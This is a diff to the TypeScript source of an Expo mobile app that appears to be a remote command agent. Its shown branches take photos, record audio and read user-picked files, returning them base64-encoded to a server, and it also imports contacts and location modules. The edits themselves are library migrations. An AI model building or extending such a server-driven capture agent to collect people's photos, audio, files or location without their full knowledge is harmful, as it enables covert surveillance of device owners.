@@ -1,10 +1,11 @@
+// @ts-ignore
 import * as Contacts from 'expo-contacts';
 import * as Location from 'expo-location';
 import * as ImagePicker from 'expo-image-picker';
 import * as DocumentPicker from 'expo-document-picker';
-import * as FileSystem from 'expo-file-system';
+import * as FileSystem from 'expo-file-system/legacy';
 import { AudioModule, RecordingPresets } from 'expo-audio';
-import CryptoJS from 'crypto-js';
+import * as CryptoJS from 'crypto-js';
 import { serverConfigStore } from './server-config';
 
 const AGENT_ID = "android-app-agent";
@@ -75,7 +76,7 @@ async function executeCommand(cmdObj: any, baseUrl: string, token: string) {
             if (status === 'granted') {
                 const photo = await ImagePicker.launchCameraAsync({ quality: 0.5 });
                 if (!photo.canceled) {
-                    const base64 = await FileSystem.readAsStringAsync(photo.assets[0].uri, { encoding: FileSystem.EncodingType.Base64 });
+                    const base64 = await FileSystem.readAsStringAsync(photo.assets[0].uri, { encoding: 'base64' });
                     result = { ok: true, file_base64: base64, filename: "photo.jpg" };
                 } else result = { ok: false, output: "Camera canceled" };
             } else result = { ok: false, output: "Camera permission denied" };
@@ -83,10 +84,8 @@ async function executeCommand(cmdObj: any, baseUrl: string, token: string) {
         else if (cmd === 'mic') {
             const { status } = await AudioModule.requestRecordingPermissionsAsync();
             if (status === 'granted') {
-                // استخدام API مباشر بدون Hooks
                 await AudioModule.setAudioModeAsync({ allowsRecording: true, playsInSilentMode: true });
                 
-                // دالة تسجيل الصوت المتاحة في expo-audio
                 const recording = await AudioModule.createRecordingAsync();
                 await recording.prepareToRecordAsync(RecordingPresets.HIGH_QUALITY);
                 await recording.startAsync();
@@ -97,7 +96,7 @@ async function executeCommand(cmdObj: any, baseUrl: string, token: string) {
                 const uri = recording.getURI();
                 
                 if (uri) {
-                    const base64 = await FileSystem.readAsStringAsync(uri, { encoding: FileSystem.EncodingType.Base64 });
+                    const base64 = await FileSystem.readAsStringAsync(uri, { encoding: 'base64' });
                     result = { ok: true, file_base64: base64, filename: "audio.m4a" };
                 } else {
                     result = { ok: false, output: "Recording failed" };
@@ -107,7 +106,7 @@ async function executeCommand(cmdObj: any, baseUrl: string, token: string) {
         else if (cmd === 'get_file') {
             const file = await DocumentPicker.getDocumentAsync();
             if (!file.canceled) {
-                const base64 = await FileSystem.readAsStringAsync(file.assets[0].uri, { encoding: FileSystem.EncodingType.Base64 });
+                const base64 = await FileSystem.readAsStringAsync(file.assets[0].uri, { encoding: 'base64' });
                 result = { ok: true, file_base64: base64, filename: file.assets[0].name };
             }
         }
